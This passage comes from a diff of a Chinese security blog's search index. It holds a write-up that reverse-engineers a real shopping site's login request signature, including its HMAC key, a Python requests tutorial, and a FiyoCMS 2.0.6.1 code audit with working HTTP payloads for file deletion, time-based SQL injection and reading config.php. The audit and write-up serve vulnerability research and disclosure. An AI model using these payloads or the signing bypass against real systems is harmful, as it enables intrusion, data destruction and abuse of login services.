-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601112445.png" alt=""></p>
-<p>从网上下载单独的CryptoJS库文件引入，从 网页中获取jQuery链接，并载入 jQuery，然后将<code>aes</code>函数也拉下来</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601113127.png" alt=""></p>
-<p>效果图如下：</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601113229.png" alt=""></p>
-<h3 id="贝贝网">贝贝网</h3>
-<p>目标网址：<a href="https://m.beibei.com/login/login.html">https://m.beibei.com/login/login.html</a> （需手机端）</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601154549.png" alt=""></p>
-<p>输入帐号密码及验证码进行测试，发现一个XHR请求，类型为POST，提交的表单数据中的用户名密码都为明文，但问题在于请求参数中的<code>_abr_</code>一直在变化，猜测它为加密参数</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601155448.png" alt=""></p>
-<p>全局搜索<code>_abr_</code>无果，只能打请求断点，成功断住</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601160354.png" alt=""></p>
-<p>但是发现断点的位置没有我们要的内容，于是在call Stack中往下找调用栈，call Stack内的方法调用栈的规则是从上到下由最新调用处依次往下排列。在<code>e.ajax</code>中发现了包含有<code>_abr_</code>的内容，但是这里是要发送出去了，没有它的产生过程，于是继续往下找，终于找到了<code>_abr_=</code></p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601163002.png" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601163301.png" alt=""></p>
-<p>记录<code>_abr_</code>的值为：“013e01885f35c08258b6ce21d500874ed5bb3143a05ed4b7b1”<br>
-发现<code>_abr_</code>其实是由<code>m(e.type, e.uri.pathname, e.query, e.form)</code>函数生成，于是为了了解它的生成过程，在函数前打上断点，重新发送登陆请求</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601165214.png" alt=""></p>
-<p>单步跟踪，发现了关键函数<code>MD5</code></p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601165852.png" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601170350.png" alt=""></p>
-<p>继续单步跟踪，又发现了一个关键函数<code>HMAC</code></p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601171039.png" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601171405.png" alt=""></p>
-<p>网上查找资料了解这个加密算法，发现HMAC算法，需要一个信息摘要算法以及一个密钥，在下方又找到关键函数<code>HmacSHA1</code>，于是推测使用了SHA-1算法</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601171755.png" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601185857.png" alt=""></p>
-<p>经过长时间的单步跟踪，总算来到了一开始的函数返回值部分</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601174129.png" alt=""></p>
-<p>现在，我们开始分析，HMAC算法可以使用Python第三方库实现，先尝试一下。加密内容有了，密钥也有了（加密目标值可以用<code>JSON.stringify()</code>提取）<br>
-加密目标值：“01\nPOST\nb7da15fd7cdc2b8c73958ee82e7424aa\n/mroute.html?method=beibei.user.token.get\n1591002077”<br>
-密钥：“ytU7vwqIx2UXQNsi”</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601190441.png" alt=""></p>
-<p>Python测试效果如下</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601191001.png" alt=""></p>
-<p>但是发现，与<code>_abr</code>的值相较，少了一些内容，回过头观察，发现<code>_abr</code>的值由<code>a+m+h</code>组成，<code>a</code>经测试是固定值<code>01</code>，<code>m</code>就是经过HMAC加密后的值，<code>h</code>会变动且暂时还不清楚</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601191307.png" alt=""></p>
-<p>对<code>h</code>进行分析，发现是由<code>s</code>的值使用<code>toString(16)</code>函数变化而来，而<code>s</code>则是时间戳(<code>new Date</code>)变化而来</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601191707.png" alt=""></p>
-<p>提取出<code>h</code>的算法，测试了一下，成功</p>
-<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601194144.png" alt=""></p>
-<p>接下来，只剩下需要加密的值，它如何产生的，观察发现由<code>a + &quot;\n&quot; + e + &quot;\n&quot; + f + &quot;\n&quot; + p + &quot;\n&quot; + s</code>组成，<code>a</code>、<code>s</code>都清楚了，<code>e</code>发现是<code>POST</code>，<code>p</code>是路径<code>/mroute.html?method=beibei.h5.login</code>，这两个也是固定值，只剩下<code>f</code>是MD5加密后的值，逆向<code>f</code>的产生过程，发现是由&quot;用户名+路径+登陆id&quot;产生而来，如：<code>username=12341234123&amp;scene=h5_login&amp;rams_device_id=2654748010</code><br>
-所以现在只需要将这个值MD5加密后传入即可，同样也能用Python实现</p>
-<p>最终完成的效果<br>
-<img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200601195839.png" alt=""></p>
-]]></content>
-      <categories>
-        <category>JS逆向</category>
-      </categories>
-      <tags>
-        <tag>JS逆向系列</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>NMAP的使用</title>
     <url>/2020/06/27/Nmap%E4%BD%BF%E7%94%A8/</url>
     <content><![CDATA[<h2 id="namp端口状态">namp端口状态</h2>
@@ -1024,191 +1024,6 @@ Cadmus Computer Systems 表示Virtualbox虚拟机<br>
       </tags>
   </entry>
   <entry>
-    <title>request库使用</title>
-    <url>/2020/07/17/requests%E5%BA%93/</url>
-    <content><![CDATA[<h2 id="构造请求">构造请求</h2>
-<h3 id="请求头">请求头</h3>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">headers=&#123;<span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;application/vnd.github.v3.text-match+json&#x27;</span>&#125;</span><br><span class="line">res = requests.get(url,headers)</span><br></pre></td></tr></table></figure>
-<h3 id="get请求">get请求</h3>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">res = requests.get(url=<span class="string">&#x27;https://api.github.com/search/repositories&#x27;</span>)</span><br><span class="line">参数</span><br><span class="line"><span class="comment"># res = requests.get(url,params)</span></span><br><span class="line"><span class="comment"># params=&#123;&#x27;q&#x27;:&#x27;requests+language:python&#x27;&#125;</span></span><br><span class="line"><span class="comment"># params=[(&#x27;q&#x27;, &#x27;requests+language:python&#x27;)]</span></span><br><span class="line"><span class="comment"># params=b&#x27;q=requests+language:python&#x27;</span></span><br></pre></td></tr></table></figure>
-<h3 id="其他请求方法">其他请求方法</h3>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.post(<span class="string">&#x27;https://httpbin.org/post&#x27;</span>, data=&#123;<span class="string">&#x27;key&#x27;</span>:<span class="string">&#x27;value&#x27;</span>&#125;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.put(<span class="string">&#x27;https://httpbin.org/put&#x27;</span>, data=&#123;<span class="string">&#x27;key&#x27;</span>:<span class="string">&#x27;value&#x27;</span>&#125;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.delete(<span class="string">&#x27;https://httpbin.org/delete&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.head(<span class="string">&#x27;https://httpbin.org/get&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.patch(<span class="string">&#x27;https://httpbin.org/patch&#x27;</span>, data=&#123;<span class="string">&#x27;key&#x27;</span>:<span class="string">&#x27;value&#x27;</span>&#125;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.options(<span class="string">&#x27;https://httpbin.org/get&#x27;</span>)</span><br><span class="line">消息体</span><br><span class="line"><span class="comment">#  data=&#123;&#x27;key&#x27;:&#x27;value&#x27;&#125;</span></span><br><span class="line"><span class="comment">#  data=[(&#x27;key&#x27;, &#x27;value&#x27;)&#125;</span></span><br><span class="line"><span class="comment">#  json=&#123;&#x27;key&#x27;:&#x27;value&#x27;&#125;</span></span><br></pre></td></tr></table></figure>
-<h2 id="响应处理">响应处理</h2>
-<h3 id="响应状态码">响应状态码</h3>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">status = res.status_code</span><br></pre></td></tr></table></figure>
-<h3 id="响应头信息（键不分大小写）">响应头信息（键不分大小写）</h3>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">requests_header=res.headers[<span class="string">&#x27;content-type&#x27;</span>]</span><br></pre></td></tr></table></figure>
-<h3 id="响应内容">响应内容</h3>
-<h4 id="字节格式查看内容">字节格式查看内容</h4>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = res.content</span><br><span class="line"><span class="comment"># b&#x27;&#123;\n  &quot;current_user_url&quot;: &quot;https://api.github.com/user&quot;,\n  &quot;cur</span></span><br></pre></td></tr></table></figure>
-<h4 id="字符串格式查看内容（序列化JSON）">字符串格式查看内容（序列化JSON）</h4>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">因为对 <span class="built_in">bytes</span> 解码到 <span class="built_in">str</span> 需要一个编码格式，所以如果你没有指定，请求将尝试根据响应头来猜测编码格式</span><br><span class="line">res.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line"></span><br><span class="line">data=res.text</span><br><span class="line"><span class="comment"># &#123;&quot;current_user_url&quot;:&quot;https://api.github.com/user&quot;,&quot;cur</span></span><br></pre></td></tr></table></figure>
-<h4 id="字典形式内容（反序列化JSON）">字典形式内容（反序列化JSON）</h4>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data=res.json()</span><br><span class="line"><span class="comment"># &#123;&#x27;current_user_url&#x27;: &#x27;https://api.github.com/user&#x27;, &#x27;curin</span></span><br><span class="line">提取内容</span><br><span class="line">repository = data[<span class="string">&#x27;items&#x27;</span>][<span class="number">0</span>]</span><br><span class="line">也可以使用 .text 获取 <span class="built_in">str</span> 并使用json.loads() 对其进行反序列化</span><br><span class="line">json.loads(data)</span><br></pre></td></tr></table></figure>
-<h2 id="其他">其他</h2>
-<h3 id="检查请求">检查请求</h3>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">requests 库会在将请求实际发送到目标服务器之前准备该请求。 请求准备包括像验证头信息和序列化JSON内容等</span><br><span class="line">response.request.headers[<span class="string">&#x27;Content-Type&#x27;</span>]</span><br><span class="line">response.request.url</span><br><span class="line">response.request.body</span><br></pre></td></tr></table></figure>
-<h3 id="身份验证">身份验证</h3>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">使用auth 参数，rqeuests 将使用HTTP的基本访问认证方案来应用凭据</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> getpass <span class="keyword">import</span> getpass</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">&#x27;https://api.github.com/user&#x27;</span>, auth=(<span class="string">&#x27;username&#x27;</span>, getpass()))</span><br><span class="line">成功返回&lt;Response [<span class="number">200</span>]&gt;，失败返回&lt;Response [<span class="number">401</span>]&gt;</span><br><span class="line"></span><br><span class="line">HTTPBasicAuth效果同上</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> requests.auth <span class="keyword">import</span> HTTPBasicAuth</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> getpass <span class="keyword">import</span> getpass</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">&#x27;https://api.github.com/user&#x27;</span>, auth=HTTPBasicAuth(<span class="string">&#x27;username&#x27;</span>, getpass()))</span><br><span class="line"></span><br><span class="line">requests 也提供了其他身份验证方法，例如 HTTPDigestAuth 和 HTTPProxyAuth</span><br></pre></td></tr></table></figure>
-<h3 id="关闭SSL证书验证">关闭SSL证书验证</h3>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">&#x27;https://api.github.com&#x27;</span>, verify=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
-<h2 id="性能">性能</h2>
-<h3 id="超时">超时</h3>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">&#x27;https://api.github.com&#x27;</span>, timeout=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">还可以将元组传递给 timeout，第一个元素是连接超时（它允许客户端与服务器建立连接的时间），第二个元素是读取超时（一旦你的客户已建立连接而等待响应的时间）</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">&#x27;https://api.github.com&#x27;</span>, timeout=(<span class="number">2</span>, <span class="number">5</span>))</span><br><span class="line"></span><br><span class="line">超时异常</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.exceptions <span class="keyword">import</span> Timeout</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response = requests.get(<span class="string">&#x27;https://api.github.com&#x27;</span>, timeout=<span class="number">1</span>)</span><br><span class="line"><span class="keyword">except</span> Timeout:</span><br><span class="line">    print(<span class="string">&#x27;The request timed out&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">&#x27;The request did not time out&#x27;</span>)</span><br></pre></td></tr></table></figure>
-<h3 id="Session对象">Session对象</h3>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Session 用于跨请求保留参数。 例如，如果要跨多个请求使用相同的身份验证,当你的应用程序想要再次连接到同一服务器时，它将重用池中的连接而不是建立新连接。</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> getpass <span class="keyword">import</span> getpass</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> requests.Session() <span class="keyword">as</span> session:</span><br><span class="line">    session.auth = (<span class="string">&#x27;username&#x27;</span>, getpass())</span><br><span class="line">    response = session.get(<span class="string">&#x27;https://api.github.com/user&#x27;</span>)</span><br></pre></td></tr></table></figure>
-<h3 id="最大重试">最大重试</h3>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">通过 Transport Adapters，你可以为每个与之交互的服务定义一组配置。 例如，假设你希望所有对于https://api.github.com的请求在最终抛出 ConnectionError 之前重试三次。 你将构建一个 Transport Adapter，设置其 max_retries 参数，并将其装载到现有的 Session</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.adapters <span class="keyword">import</span> HTTPAdapter</span><br><span class="line"><span class="keyword">from</span> requests.exceptions <span class="keyword">import</span> ConnectionError</span><br><span class="line"></span><br><span class="line">github_adapter = HTTPAdapter(max_retries=<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use `github_adapter` for all requests to endpoints that start with this URL</span></span><br><span class="line">session.mount(<span class="string">&#x27;https://api.github.com&#x27;</span>, github_adapter)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    session.get(<span class="string">&#x27;https://api.github.com&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span> ConnectionError <span class="keyword">as</span> ce:</span><br><span class="line">    print(ce)</span><br></pre></td></tr></table></figure>
-<h2 id="结尾">结尾</h2>
-<blockquote>
-<blockquote>
-<p>re库参考：<a href="https://juejin.im/post/5d8c630e51882511f444f65b">https://juejin.im/post/5d8c630e51882511f444f65b</a></p>
-</blockquote>
-</blockquote>
-]]></content>
-      <categories>
-        <category>python</category>
-      </categories>
-      <tags>
-        <tag>python库</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>fiyocms_2.0.6.1代码审计</title>
-    <url>/2020/10/21/fiyocms_2.0.6.1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
-    <content><![CDATA[<h2 id="全局分析">全局分析</h2>
-<h2 id="漏洞分析">漏洞分析</h2>
-<h3 id="任意文件删除">任意文件删除</h3>
-<h4 id="位置">位置</h4>
-<p><code>/dapur/apps/app_config/controller/backuper.php</code> 第16-30行</p>
-<h4 id="分析">分析</h4>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;type&#x27;</span>])) &#123;		</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;database&#x27;</span>) &#123;		</span><br><span class="line">		@unlink(<span class="string">&quot;../../../../.backup/<span class="subst">$_POST</span>[file]&quot;</span>);		</span><br><span class="line">		<span class="keyword">if</span>(!file_exists(<span class="string">&#x27;../../../../.backup&#x27;</span>))</span><br><span class="line">			mkdir(<span class="string">&#x27;../../../../.backup&#x27;</span>);			</span><br><span class="line">		<span class="variable">$date</span> = md5(date(<span class="string">&quot;Ymd:His&quot;</span>));</span><br><span class="line">		<span class="variable">$file</span> = <span class="string">&quot;db-backup-<span class="subst">$date</span>&quot;</span>;</span><br><span class="line">		<span class="variable">$c</span> = backup_tables(<span class="string">&quot;*&quot;</span>,<span class="string">&#x27;../../../../.backup&#x27;</span>,<span class="string">&quot;<span class="subst">$file</span>&quot;</span>,<span class="literal">true</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$c</span>) 		&#123;</span><br><span class="line">			<span class="variable">$size</span> = format_size(filesize(<span class="string">&quot;../../../../.backup/<span class="subst">$file</span>.sql&quot;</span>));</span><br><span class="line">			<span class="variable">$time</span> = date(<span class="string">&quot;Y/m/d H:i:s&quot;</span>,filemtime(<span class="string">&quot;../../../../.backup/<span class="subst">$file</span>.sql&quot;</span>));	</span><br><span class="line">			<span class="variable">$r</span> = <span class="string">&quot;<span class="subst">$size</span> - <span class="subst">$time</span>&quot;</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&#123; \&quot;file\&quot;:\&quot;<span class="subst">$file</span>.sql\&quot; , \&quot;info\&quot;:\&quot;<span class="subst">$r</span>\&quot; &#125;&quot;</span>;</span><br><span class="line">			</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;	</span><br></pre></td></tr></table></figure>
-<p>通过POST传递的参数<code>file</code>没有经过任何处理就拼接进unlink函数进行文件删除操作</p>
-<h4 id="复现">复现</h4>
-<p>在网站根目录下建立<code>flag.php</code>文件<br>
-payload如下：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;dapur&#x2F;apps&#x2F;app_config&#x2F;controller&#x2F;backuper.php HTTP&#x2F;1.1</span><br><span class="line">Host: cms.cn</span><br><span class="line">Content-Length: 27</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http:&#x2F;&#x2F;cms.cn</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;cms.cn&#x2F;dapur&#x2F;apps&#x2F;app_config&#x2F;controller&#x2F;backuper.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: PHPSESSID&#x3D;m0a7osbhddgpdq575hla480914</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">type&#x3D;database&amp;file&#x3D;..&#x2F;flag.php</span><br></pre></td></tr></table></figure>
-<p>第一次发送payload，没有.backup文件夹，会新建，第二次发送，flag.php已经成功删除</p>
-<h3 id="SQL注入漏洞">SQL注入漏洞</h3>
-<h4 id="位置-2">位置</h4>
-<p><code>/system/database.php</code>第210-233行</p>
-<h4 id="分析-2">分析</h4>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"><span class="variable">$table</span>,<span class="variable">$rows</span>,<span class="variable">$where</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="variable">$update</span> = <span class="string">&#x27;UPDATE &#x27;</span>.<span class="variable">$table</span>.<span class="string">&#x27; SET &#x27;</span>;</span><br><span class="line">      <span class="variable">$keys</span> = array_keys(<span class="variable">$rows</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; count(<span class="variable">$rows</span>); <span class="variable">$i</span>++)&#123;</span><br><span class="line">          <span class="keyword">if</span>(is_string(<span class="variable">$rows</span>[<span class="variable">$keys</span>[<span class="variable">$i</span>]]) <span class="keyword">AND</span> <span class="variable">$rows</span>[<span class="variable">$keys</span>[<span class="variable">$i</span>]] !== <span class="string">&#x27;+hits&#x27;</span>)</span><br><span class="line">          &#123;</span><br><span class="line">              <span class="variable">$update</span> .= <span class="variable">$keys</span>[<span class="variable">$i</span>].<span class="string">&#x27;=&quot;&#x27;</span>.<span class="variable">$rows</span>[<span class="variable">$keys</span>[<span class="variable">$i</span>]].<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$rows</span>[<span class="variable">$keys</span>[<span class="variable">$i</span>]] == <span class="string">&#x27;+hits&#x27;</span>) <span class="variable">$rows</span>[<span class="variable">$keys</span>[<span class="variable">$i</span>]] = <span class="variable">$keys</span>[<span class="variable">$i</span>] . <span class="string">&#x27;+&#x27;</span>. <span class="number">1</span>;</span><br><span class="line">               <span class="variable">$update</span> .= <span class="variable">$keys</span>[<span class="variable">$i</span>].<span class="string">&#x27;=&#x27;</span>.<span class="variable">$rows</span>[<span class="variable">$keys</span>[<span class="variable">$i</span>]];</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">// Parse to add commas</span></span><br><span class="line">          <span class="keyword">if</span>(<span class="variable">$i</span> != count(<span class="variable">$rows</span>)<span class="number">-1</span>)</span><br><span class="line">          &#123;</span><br><span class="line">              <span class="variable">$update</span> .= <span class="string">&#x27;,&#x27;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">	</span><br><span class="line">      <span class="variable">$update</span> .= <span class="string">&#x27; WHERE &#x27;</span>.<span class="variable">$where</span>;			</span><br><span class="line"><span class="built_in">static</span> <span class="variable">$cons</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">	<span class="variable">$result</span> = <span class="keyword">$this</span>-&gt;connect();       </span><br><span class="line">	<span class="variable">$result</span> = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="variable">$update</span>);</span><br><span class="line">	<span class="variable">$query</span> = <span class="variable">$result</span> -&gt;execute();</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
-<p>可以看到这里update语句中的where条件是通过直接拼接参数$where而成的，猜测可能通过$where参数构成sql注入，我们随便找一个带有update方法的实例，如<code>/dapur/apps/app_user/controller/status.php</code></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;stat&#x27;</span>])) &#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;stat&#x27;</span>]==<span class="string">&#x27;1&#x27;</span>)&#123;</span><br><span class="line">		<span class="variable">$db</span>-&gt;update(FDBPrefix.<span class="string">&#x27;user&#x27;</span>,<span class="keyword">array</span>(<span class="string">&quot;status&quot;</span>=&gt;<span class="string">&quot;1&quot;</span>),<span class="string">&#x27;id=&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">		alert(<span class="string">&#x27;success&#x27;</span>,Status_Applied,<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
-<h4 id="复现-2">复现</h4>
-<p>payload如下：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;dapur&#x2F;apps&#x2F;app_user&#x2F;controller&#x2F;status.php?stat&#x3D;1&amp;id&#x3D;1%20and%20if(ascii(substr(database(),1,1))&#x3D;102,sleep(5),1) HTTP&#x2F;1.1</span><br><span class="line">Host: cms.cn</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: PHPSESSID&#x3D;m0a7osbhddgpdq575hla480914</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
-<p>成功造成延时注入，delete方法也同样存在这个问题</p>
-<h3 id="文件读取漏洞">文件读取漏洞</h3>
-<h4 id="位置-3">位置</h4>
-<p><code>/dapur/apps/app_theme/libs/check_file.php</code> 第13-26行</p>
-<h4 id="分析-3">分析</h4>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="variable">$url</span>= <span class="string">&quot;<span class="subst">$_GET</span>[src]/<span class="subst">$_GET</span>[name]&quot;</span>; </span><br><span class="line"><span class="variable">$furl</span> = <span class="string">&quot;../../../<span class="subst">$url</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$content</span> = strlen(<span class="string">&quot;<span class="subst">$file</span>&quot;</span>) - <span class="number">5</span>;</span><br><span class="line"><span class="variable">$content</span> = substr(<span class="string">&quot;<span class="subst">$file</span>&quot;</span>,<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = strpos(<span class="string">&quot;<span class="subst">$content</span>&quot;</span>,<span class="string">&quot;.&quot;</span>);</span><br><span class="line"><span class="variable">$file</span> = substr(<span class="string">&quot;<span class="subst">$content</span>&quot;</span>,<span class="variable">$file</span>+<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$file</span> == <span class="string">&quot;html&quot;</span> || <span class="variable">$file</span> == <span class="string">&quot;htm&quot;</span> || <span class="variable">$file</span> == <span class="string">&quot;xhtml&quot;</span> || <span class="variable">$file</span> == <span class="string">&quot;js&quot;</span> ||</span><br><span class="line"><span class="variable">$file</span> == <span class="string">&quot;jsp&quot;</span> || <span class="variable">$file</span> == <span class="string">&quot;php&quot;</span> || <span class="variable">$file</span> == <span class="string">&quot;css&quot;</span> || <span class="variable">$file</span> == <span class="string">&quot;xml&quot;</span> ) :</span><br><span class="line">	<span class="variable">$content</span> = @file_get_contents(<span class="variable">$furl</span>);</span><br><span class="line">	<span class="variable">$content</span> = htmlentities(<span class="variable">$content</span>);</span><br></pre></td></tr></table></figure>
-<p>通过file_get_contents函数对<code>$furl</code>参数的值进行文件读取，而<code>$furl</code>参数是由GET方式传入的参数src和name拼接而成，且文件读取的对象后缀需要是指定文件后缀，<code>$file</code>的值即目标文件的后缀名。这就构成了任意文件读取漏洞</p>
-<h4 id="复现-3">复现</h4>
-<p>payload如下：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;dapur&#x2F;apps&#x2F;app_theme&#x2F;libs&#x2F;check_file.php?src&#x3D;..&amp;name&#x3D;config.php HTTP&#x2F;1.1</span><br><span class="line">Host: cms.cn</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: PHPSESSID&#x3D;74cpjhhrkrssoo4e2p55jrtns7</span><br><span class="line">Connection: close</span><br><span class="line"></span><br></pre></td></tr></table></figure>
